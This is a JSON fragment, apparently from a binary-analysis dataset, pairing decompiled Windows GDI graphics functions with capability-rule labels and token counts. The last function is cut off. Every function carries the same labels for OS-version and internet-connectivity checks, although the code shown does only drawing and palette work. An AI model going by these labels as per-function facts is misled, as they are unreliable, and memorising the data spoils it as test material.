        "decompiled_code": "\nvoid fcn.00423c54(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x423c66;\n    fcn.0042399c();\n    uStack28 = 0x423cb4;\n    iVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    for (puVar2 = *(in_EAX + 4); puVar2 != NULL; puVar2 = *puVar2) {\n        iStack32 = puVar2[2];\n        if ((iStack32 != 0) && (puVar2[5] < 0)) {\n            sub.gdi32.dll_DeleteObject();\n            puVar2[2] = 0;\n            iVar1 = iStack32;\n        }\n        iStack32 = iVar1;\n        iVar1 = iStack32;\n    }\n    *in_FS_OFFSET = iVar1;\n    puStack24 = 0x423cbb;\n    uStack28 = 0x423cb3;\n    iStack32 = iVar1;\n    fcn.004239a8();\n    return;\n}\n",
        "token_count": 305
    },
    "004241e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004241e0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 10) != 0) {\n        (**(in_EAX + 8))();\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "00424c80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00424c80(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack28 = 0x424c9f;\n        fcn.0042399c();\n        uStack32 = 0x424d06;\n        iStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        if (*(var_4h + 8) == 0) {\n            var_14h = *(*(var_4h + 0x1c) * 2 + 0x48fdfc);\n            var_10h = *(var_4h + 0x18);\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.004241b0();\n            puStack40 = &fcn.00424c80::var_14h;\n            uVar1 = sub.gdi32.dll_CreatePenIndirect();\n            *(var_4h + 8) = uVar1;\n        }\n        *in_FS_OFFSET = puStack40;\n        uStack32 = 0x424d0d;\n        iStack36 = 0x424d05;\n        uVar1 = fcn.004239a8();\n        return uVar1;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 401
    },
    "00424f6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00424f6c(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack24 = 0x424f8f;\n        fcn.0042399c();\n        uStack28 = 0x42503a;\n        puStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        if (*(var_4h + 8) == 0) {\n            if (*(var_4h + 0x18) == NULL) {\n                var_8h = 0;\n                uVar1 = *(var_4h + 0x1c);\n                if (uVar1 == 0) {\n                    var_10h = 0;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else if (uVar1 == 1) {\n                    var_10h = 1;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else {\n                    var_10h = 2;\n                    var_8h = (uVar1 & 0x7f) - 2;\n                    puStack24 = &stack0xfffffffc;\n                }\n            }\n            else {\n                var_10h = 3;\n                puStack24 = &stack0xfffffffc;\n                (**(**(var_4h + 0x18) + 0x70))();\n                var_8h = (**(**(var_4h + 0x18) + 0x68))();\n            }\n            var_ch = fcn.004241b0();\n            puStack32 = &fcn.00424f6c::var_10h;\n            uVar2 = sub.gdi32.dll_CreateBrushIndirect();\n            *(var_4h + 8) = uVar2;\n        }\n        *in_FS_OFFSET = puStack32;\n        puStack24 = 0x425041;\n        uStack28 = 0x425039;\n        uVar2 = fcn.004239a8();\n        return uVar2;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 558
    },
    "004253e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.004253e0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uchar *puStack20;\n    uchar auStack16 [8];\n    \n    uVar2 = 0;\n    if ((*(in_EAX + 0x54) & 0x80) != 0) {\n        iVar1 = fcn.00425694();\n        sub.gdi32.dll_GetWindowOrgEx();\n        puStack20 = auStack16;\n        if (iVar1 != 0) {\n            uVar2 = 1;\n            puStack20 = auStack16;\n        }\n    }\n    return CONCAT44(puStack20, uVar2);\n}\n",
        "token_count": 157
    },
    "0042552c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.0042552c(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_1h;\n    \n    uStack16 = 0x497a30;\n    puStack20 = 0x42553d;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack24 = 0x425578;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x50) == 0) {\n        puStack20 = &fcn.0042552c::var_1h + 1;\n        fcn.00425350();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x42557f;\n    uStack24 = 0x497a30;\n    uStack28 = 0x425577;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 248
    },
    "00425aa8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425aa8(char param_1, uint *param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff44;\n    int32_t iStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint *puStack92;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint lpvObject;\n    uint var_30h;\n    uint var_2ch;\n    uint hdcDest;\n    int32_t var_18h;\n    int32_t hdc;\n    int32_t var_10h;\n    uint nWidth;\n    uint nHeight;\n    uint hgdiobj;\n    \n    nWidth = *param_2;\n    nHeight = param_2[1];\n    uStack72 = 0;\n    uStack76 = 0x425ac4;\n    hgdiobj = in_EAX;\n    var_18h = sub.gdi32.dll_CreateCompatibleDC();\n    uStack76 = 0;\n    puStack80 = 0x425ace;\n    hdcDest = sub.gdi32.dll_CreateCompatibleDC();\n    uStack84 = 0x425bf6;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = &fcn.00425aa8::lpvObject;\n    uStack96 = 0x18;\n    uStack100 = hgdiobj;\n    uStack104 = 0x425aee;\n    puStack80 = &stack0xfffffffc;\n    sub.gdi32.dll_GetObjectA();\n    if (param_1 != '\\0') {\n        uStack104 = 0;\n        puStack108 = 0x1;\n        uStack112 = 1;\n        iStack116 = nHeight;\n        var_10h = sub.gdi32.dll_CreateBitmap(nWidth);\n        if (var_10h != 0) {\n            iVar1 = sub.gdi32.dll_SelectObject(var_18h, hgdiobj);\n            iVar2 = sub.gdi32.dll_SelectObject(hdcDest, var_10h);\n            sub.gdi32.dll_StretchBlt(hdcDest, 0, 0, nWidth, nHeight, var_18h, 0, 0, var_30h, var_2ch, 0xcc0020);\n            if (iVar1 != 0) {\n                in_stack_ffffff44 = var_18h;\n                sub.gdi32.dll_SelectObject(var_18h, iVar1);\n            }\n            if (iVar2 != 0) {\n                sub.gdi32.dll_SelectObject(hdcDest, iVar2);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffff44;\n        sub.gdi32.dll_DeleteDC(var_18h, 0x425bfd);\n        sub.gdi32.dll_DeleteDC(hdcDest);\n        return;\n    }\n    uStack104 = 0;\n    puStack108 = 0x425b11;\n    hdc = sub.user32.dll_GetDC();\n    if (hdc == 0) {\n        puStack108 = 0x425b1f;\n        fcn.004259f0();\n    }\n    uStack112 = 0x425b65;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    iVar1 = hdc;\n    puStack108 = &stack0xfffffffc;\n    var_10h = sub.gdi32.dll_CreateCompatibleBitmap(hdc, nWidth, nHeight);\n    if (var_10h == 0) {\n        fcn.004259f0();\n    }\n    *in_FS_OFFSET = iVar1;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x425b6c);\n    return;\n}\n",
        "token_count": 879
    },
    "00425c48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00425c48(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h, \n            uint hdc, int32_t arg_28h, int32_t arg_2ch)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    int32_t hpal;\n    uint var_20h;\n    uint crColor;\n    uint var_18h;\n    uint hgdiobj;\n    uint hdcDest;\n    uint nYOriginDest;\n    uint nXOriginDest;\n    \n    if (((**0x4927cc == 2) && (arg_18h == arg_2ch)) && (arg_14h == arg_28h)) {\n        uStack56 = 1;\n        puStack60 = 0x1;\n        uStack64 = hdc;\n        uStack68 = 0x425c90;\n        sub.gdi32.dll_CreateCompatibleBitmap();\n        uStack68 = 0x425c95;\n        uStack68 = fcn.00425a98();\n        iStack72 = arg_10h;\n        puStack76 = 0x425ca5;\n        uVar1 = sub.gdi32.dll_SelectObject();\n        uStack80 = 0x425d10;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        uVar5 = 0xccaa0029;\n        uVar2 = uVar1;\n        puStack76 = &stack0xfffffffc;\n        sub.gdi32.dll_MaskBlt();\n        *in_FS_OFFSET = in_EAX;\n        uVar2 = sub.gdi32.dll_SelectObject\n                          (arg_10h, uVar1, 0x425ec4, arg_2ch, arg_28h, hdc, arg_20h, arg_1ch, uVar2, arg_ch, arg_8h, \n                           uVar5);\n        sub.gdi32.dll_DeleteObject(uVar2);\n        return;\n    }\n    uStack56 = 0;\n    puStack60 = 0x425d23;\n    sub.gdi32.dll_CreateCompatibleDC();\n    puStack60 = 0x425d28;\n    uVar2 = fcn.00425a98();\n    uStack64 = 0x425ebd;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    iStack72 = arg_14h;\n    puStack76 = arg_18h;\n    uStack80 = hdc;\n    uStack84 = 0x425d44;\n    puStack60 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack84 = 0x425d49;\n    uVar1 = fcn.00425a98();\n    uStack84 = uVar1;\n    iVar3 = sub.gdi32.dll_SelectObject(uVar2);\n    iVar4 = sub.gdi32.dll_SelectPalette(hdc, *0x4979fc, 0);\n    sub.gdi32.dll_SelectPalette(hdc, iVar4, 0);\n    if (iVar4 == 0) {\n        hpal = sub.gdi32.dll_SelectPalette(uVar2, *0x4979fc, 0xffffffff);\n    }\n    else {\n        hpal = sub.gdi32.dll_SelectPalette(uVar2, iVar4, 0xffffffff);\n    }\n    sub.gdi32.dll_RealizePalette(uVar2);\n    sub.gdi32.dll_StretchBlt(uVar2, 0, 0, arg_18h, arg_14h, arg_10h, arg_ch, arg_8h, arg_18h, arg_14h, 0xcc0020);\n    sub.gdi32.dll_StretchBlt(uVar2, 0, 0, arg_18h, arg_14h, hdc, arg_20h, arg_1ch, arg_18h, arg_14h, 0x440328);\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    if (iVar3 != 0) {\n        sub.gdi32.dll_SelectObject(uVar2, iVar3);\n    }\n    sub.gdi32.dll_DeleteObject();\n    *in_FS_OFFSET = uVar1;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar2, hpal, 0, 0x425ec4);\n    }\n    sub.gdi32.dll_DeleteDC(uVar2);\n    return;\n}\n",
        "token_count": 1139
    },
    "004260f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004260f8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffb8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint hdc;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if (*0x4979fc != 0) {\n        uStack20 = 0;\n        puStack24 = 0x426115;\n        uVar1 = sub.user32.dll_GetDC();\n        uStack28 = 0x42617e;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &fcn.004260f8::var_1h + 1;\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar1, 0x68);\n        if (0xf < iVar2) {\n            sub.gdi32.dll_GetPaletteEntries(*0x4979fc, 0, 8, in_EAX + 4);\n            in_stack_ffffffb8 = *0x4979fc;\n            sub.gdi32.dll_GetPaletteEntries(*0x4979fc, 8, 8, in_EAX + -0x1c + *(in_EAX + 2) * 4);\n            var_1h._0_1_ = 1;\n        }\n        *in_FS_OFFSET = in_stack_ffffffb8;\n        uVar1 = sub.user32.dll_ReleaseDC(0, uVar1, 0x426185);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 418
    },
    "00426190": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00426190(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uStack1080;\n    uint32_t uStack1076;\n    uint uStack1072;\n    uint32_t uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uchar *puStack1056;\n    uint32_t uStack1052;\n    uint uStack1048;\n    uint uStack1044;\n    ushort uStack1040;\n    \n    uStack1040 = 0x300;\n    if (in_EAX == 0) {\n        uStack1044 = 0x4261f3;\n        fcn.004030fc();\n    }\n    else {\n        uStack1044 = 0;\n        uStack1048 = 0x4261ae;\n        uVar3 = sub.gdi32.dll_CreateCompatibleDC();\n        puStack1056 = 0x4261b7;\n        uStack1052 = uVar3;\n        uVar4 = sub.gdi32.dll_SelectObject();\n        puStack1056 = &stack0xfffffbe8;\n        uStack1060 = 0x100;\n        uStack1064 = 0;\n        uStack1072 = 0x4261cb;\n        uStack1068 = uVar3;\n        uVar2 = sub.gdi32.dll_GetDIBColorTable();\n        uStack1068 = uStack1068 & 0xffff | uVar2 << 0x10;\n        uStack1080 = 0x4261d7;\n        uStack1076 = uVar3;\n        uStack1072 = uVar4;\n        sub.gdi32.dll_SelectObject();\n        uStack1080 = uVar3;\n        sub.gdi32.dll_DeleteDC();\n    }\n    if (uStack1080._2_2_ != 0) {\n        if ((uStack1080._2_2_ != 0x10) || (cVar1 = fcn.004260f8(),  cVar1 == '\\0')) {\n            fcn.00425f8c();\n        }\n        uVar4 = sub.gdi32.dll_CreatePalette(&stack0xfffffbc8);\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 528
    },
    "00426234": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00426234(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iStack44;\n    \n    if (((in_EAX != 0) && (iVar1 = sub.gdi32.dll_GetObjectA(),  iVar1 != 0)) && (in_EAX != 0)) {\n        sub.gdi32.dll_GetPaletteEntries();\n        fcn.00425f8c();\n        iStack44 = in_EAX;\n    }\n    return CONCAT44(iStack44, iStack44);\n}\n",
        "token_count": 120
    },
    "00426288": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426288(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    int32_t iStack76;\n    uint uStack68;\n    int32_t iStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint lpbInit;\n    uint hdc;\n    uint var_ch;\n    uint var_8h;\n    uint lpbmih;\n    \n    *(in_EAX + 8) = *(in_EAX + 8) >> 1;\n    uStack40 = 0x4262b6;\n    iVar1 = fcn.00425c28();\n    *(in_EAX + 0x14) = iVar1 * *(in_EAX + 8);\n    uStack40 = 0x4262ce;\n    iVar1 = fcn.00425c08();\n    uStack40 = 0;\n    puStack44 = 0x4262d7;\n    iStack76 = sub.user32.dll_GetDC();\n    if (iStack76 == 0) {\n        puStack44 = 0x4262e5;\n        fcn.0042599c();\n    }\n    uStack48 = 0x426435;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    iStack64 = in_EAX + 0x28 + iVar1 * 4;\n    uStack56 = 0;\n    uStack68 = 4;\n    puStack80 = 0x42631f;\n    puStack44 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateDIBitmap();\n    puStack80 = 0x426324;\n    uVar2 = fcn.00425a98();\n    uStack84 = 0x42635b;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = fcn.00425aa8();\n    *in_EDX = uVar3;\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x426362;\n    uStack88 = 0x42635a;\n    uStack84 = uVar2;\n    sub.gdi32.dll_DeleteObject();\n    return;\n}\n",
        "token_count": 573
    },
    "004264e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004264e4(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar3;\n    int32_t iStack156;\n    uint uStack152;\n    uchar *puStack148;\n    uint uStack144;\n    int32_t iStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint hdc;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack132 = 0x42650a;\n    fcn.00402ee8();\n    uStack136 = 0x4267dd;\n    iStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    uStack144 = 0x426529;\n    puStack132 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    if ((*arg_ch | arg_ch[1]) == 0) {\n        uStack144 = 0xb;\n        puStack148 = 0x426537;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        *arg_8h = uVar1;\n        puStack148 = 0xc;\n        uStack152 = 0x426543;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        arg_8h[1] = uVar1;\n    }\n    else {\n        *arg_8h = *arg_ch;\n        arg_8h[1] = arg_ch[1];\n    }\n    uStack144 = 0;\n    puStack148 = 0x42655f;\n    iVar2 = sub.user32.dll_GetDC();\n    if (iVar2 == 0) {\n        puStack148 = 0x42656d;\n        fcn.0042599c();\n    }\n    uStack152 = 0x4265cd;\n    iStack156 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff64;\n    puStack148 = &stack0xfffffffc;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xe);\n    iVar3 = iVar2;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xc);\n    *in_FS_OFFSET = iVar3;\n    sub.user32.dll_ReleaseDC(0, iVar2, 0x4265d4);\n    return;\n}\n",
        "token_count": 572
    },
    "00426808": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426808(uint32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    uchar auStack96 [4];\n    int16_t iStack92;\n    int16_t iStack90;\n    uint32_t auStack84 [18];\n    \n    auStack84[3] = 0;\n    iVar1 = sub.gdi32.dll_GetObjectA();\n    if (iVar1 == 0) {\n        fcn.00425978();\n    }\n    else if ((iVar1 < 0x40) || (auStack84[0] < 0x28)) {\n        fcn.00403af4();\n        *param_2 = 0x28;\n        param_2[1] = 0x54;\n        param_2[2] = auStack96;\n    }\n    else {\n        puVar3 = auStack84;\n        puVar4 = param_2;\n        for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    if (param_1 == 2) {\n        *(param_2 + 0xe) = 1;\n    }\n    else if (param_1 - 3 < 0xe) {\n        *(param_2 + 0xe) = 4;\n        param_2[8] = param_1;\n    }\n    else if (param_1 - 0x11 < 0xf0) {\n        *(param_2 + 0xe) = 8;\n        param_2[8] = param_1;\n    }\n    else {\n        *(param_2 + 0xe) = iStack90 * iStack92;\n    }\n    *(param_2 + 3) = 1;\n    if (param_2[8] < param_2[9]) {\n        param_2[9] = param_2[8];\n    }\n    if (param_2[5] == 0) {\n        iVar1 = fcn.00425c28();\n        uVar2 = param_2[2] >> 0x1f;\n        param_2[5] = iVar1 * ((param_2[2] ^ uVar2) - uVar2);\n    }\n    return;\n}\n",
        "token_count": 563
    },
    "0042695c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042695c(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint hdc;\n    int32_t hpal;\n    uint var_1h;\n    \n    uStack32 = 0x426977;\n    fcn.00426808();\n    hpal = 0;\n    uStack32 = 0;\n    puStack36 = 0x426983;\n    uVar1 = sub.gdi32.dll_CreateCompatibleDC();\n    uStack40 = 0x4269f9;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &fcn.0042695c::var_1h + 1;\n    if (in_EDX != 0) {\n        puStack36 = &fcn.0042695c::var_1h + 1;\n        hpal = sub.gdi32.dll_SelectPalette(uVar1);\n        sub.gdi32.dll_RealizePalette(uVar1);\n    }\n    uVar4 = *(in_ECX + 8);\n    uVar3 = uVar1;\n    iVar2 = sub.gdi32.dll_GetDIBits();\n    var_1h._0_1_ = iVar2 != 0;\n    *in_FS_OFFSET = uVar3;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar1, hpal, 0, 0x426a00, uVar4, arg_ch);\n    }\n    sub.gdi32.dll_DeleteDC(uVar1);\n    return;\n}\n",
        "token_count": 441
    },
    "00426a34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00426a34(uint param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    uint *puStack104;\n    uint var_54h;\n    uint var_4ch;\n    uint var_48h;\n    uint piconinfo;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ah;\n    ushort var_26h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack104 = 0x426a53;\n    fcn.00403af4();\n    puStack104 = 0x426a62;\n    fcn.00403af4();\n    puStack104 = &fcn.00426a34::piconinfo;\n    puStack112 = 0x426a6c;\n    uStack108 = param_2;\n    sub.user32.dll_GetIconInfo();\n    puStack112 = 0x426a71;\n    fcn.00426a28();\n    uStack116 = 0x426c24;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &fcn.00426a34::var_1h + 1;\n    fcn.004268ec(2);\n    puStack132 = 0x426a9f;\n    fcn.004268ec(0xffffffff);\n    var_18h = 0;\n    var_1ch = 0;\n    var_20h = 0;\n    var_24h = 0;\n    uStack136 = 0x426bfd;\n    uStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    puStack132 = &fcn.00426a34::var_1h + 1;\n    var_18h = fcn.00402ee8();\n    var_1ch = fcn.00402ee8();\n    var_20h = fcn.00402ee8();\n    var_24h = fcn.00402ee8();\n    fcn.0042695c(2, var_1ch);\n    uVar3 = 0xffffffff;\n    fcn.0042695c(0xffffffff, var_24h);\n    if (var_1h != '\\0') {\n        var_30h = var_ch + 0x16 + var_14h + var_10h;\n        (**(*in_EAX + 0x10))();\n    }\n    var_2ah._2_2_ = 1;\n    var_26h = 1;\n    (**(*in_EAX + 0x10))();\n    iVar2 = var_20h;\n    (**(*in_EAX + 0x10))();\n   